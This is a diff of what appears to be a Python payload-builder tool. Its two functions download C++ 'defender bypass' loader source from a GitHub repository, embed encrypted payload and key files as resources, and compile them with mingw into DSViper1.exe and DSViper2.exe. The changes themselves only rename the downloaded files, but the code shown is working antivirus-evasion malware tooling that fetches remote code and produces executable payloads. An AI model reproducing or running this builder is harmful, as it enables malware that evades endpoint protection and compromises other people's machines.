@@ -60,10 +60,10 @@ def OURFIRSTMETHODXOR():
         f.write('AESCODE   RCDATA   "code.bin"\n'.encode('utf-8'))
         f.write('AESKEY    RCDATA   "key.bin"\n'.encode('utf-8'))
 
-    url = "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/XORbypass.cpp"
+    url = "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/XORbyp.cpp"
     try:
         res = requests.get(url)
-        with open("XORbypass.cpp", "wb") as f:
+        with open("XORbyp.cpp", "wb") as f:
             f.write(res.content)
     except requests.RequestException as e:
         print(f"Error: {e}")
@@ -71,12 +71,12 @@ def OURFIRSTMETHODXOR():
 
     try:
         subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
-        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper1.exe", "XORbypass.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper1.exe", "XORbyp.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper1.exe")
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
 
-    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "XORbypass.cpp"]
+    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "XORbyp.cpp"]
     for file in files:
         os.remove(file)
 
@@ -113,7 +113,7 @@ def OURSECONDMETHODAES():
     url = "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/AES/AESbypass.cpp"
     try:
         res = requests.get(url)
-        with open("AESbypass.cpp", "wb") as f:
+        with open("AESbyp.cpp", "wb") as f:
             f.write(res.content)
     except requests.RequestException as e:
         print(f"Error: {e}")
@@ -121,12 +121,12 @@ def OURSECONDMETHODAES():
     
     try:
         subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
-        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper2.exe", "AESbypass.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper2.exe", "AESbyp.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper2.exe")
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
 
-    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "AESbypass.cpp"]
+    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "AESbyp.cpp"]
     for file in files:
         os.remove(file)
     
